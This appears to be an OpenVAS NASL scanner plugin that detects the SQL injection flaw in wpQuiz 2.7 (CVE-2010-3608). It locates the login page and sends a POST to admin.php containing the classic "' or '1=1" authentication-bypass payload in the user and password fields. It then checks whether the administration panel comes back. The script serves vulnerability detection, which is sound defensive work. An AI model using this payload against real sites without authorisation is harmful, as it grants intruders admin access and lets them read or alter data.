##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wpquiz_mult_sql_inj_vuln.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# wpQuiz Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902315");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)");
  script_cve_id("CVE-2010-3608");
  script_bugtraq_id(43384);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("wpQuiz Multiple SQL Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15075/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1009-exploits/wpquiz27-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Input passed to the 'id' and 'password' parameters in 'admin.php'
  and 'user.php' scripts are not properly sanitised before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running wpQuiz and is prone multiple SQL Injection
  vulnerabilities");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to compromise
  the application, access or modify data, or exploit latent vulnerabilities in the underlying database.");
  script_tag(name:"affected", value:"wpQuiz version 2.7");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

wpPort = get_http_port(default:80);

if(!can_host_php(port:wpPort)){
  exit(0);
}

host = http_host_name(port:wpPort);

foreach dir (make_list_unique("/wp_quiz", "/wpQuiz", "/", cgi_dirs(port:wpPort)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir , "/upload/index.php"), port:wpPort);
  rcvRes = http_keepalive_send_recv(port:wpPort, data:sndReq);

  if("<title>wpQuiz >> Login - wpQuiz</title>" >< rcvRes)
  {
    filename = string(dir + "/upload/admin.php");
    authVariables ="user=%27+or+%271%3D1&pass=%27+or+%271%3D1";

    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
    rcvRes = http_keepalive_send_recv(port:wpPort, data:sndReq);

    if(">Administration Panel" >< rcvRes || "AdminCP" >< rcvRes)
    {
      security_message(port:wpPort);
      exit(0);
    }
  }
}

exit(99);